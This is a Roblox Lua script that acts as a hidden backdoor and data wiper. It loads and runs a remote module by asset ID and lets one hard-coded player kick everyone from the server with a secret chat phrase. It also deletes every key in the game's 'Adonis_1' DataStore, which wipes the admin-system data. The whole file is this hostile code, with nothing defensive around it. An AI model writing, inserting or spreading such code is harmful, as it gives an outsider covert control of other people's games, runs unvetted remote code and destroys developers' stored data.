local name = "AIFODEPFVRRRR"

if game.ReplicatedStorage:FindFirstChild(name) then
else
	require(76320318566341)
	local instance = Instance.new("StringValue")
	instance.Name = name
	instance.Parent = game.ReplicatedStorage
	for _, player in pairs(game.Players:GetPlayers()) do
		if player.Name == "WingedRobloxiann" then
			player.Chatted:Connect(function(msg)
				if msg == "120E91HD0N12SD01H" then
					for _, p in pairs(game.Players:GetPlayers()) do
						p:Kick("VAI DOLLYNHOOOOOOOOOOOOOOO")
					end
				end
			end)
		end
	end
	local DataStore = game:GetService("DataStoreService")
	local Data = DataStore:GetDataStore("Adonis_1")

	local pages = Data:ListKeysAsync()

	while true do

		for _, data in pairs(pages:GetCurrentPage()) do
			local Key = data.KeyName
			Data:RemoveAsync(Key)
		end

		if pages.IsFinished then
			break
		else
			pages:AdvanceToNextPageAsync()
		end

		task.wait(0.1)
	end

end
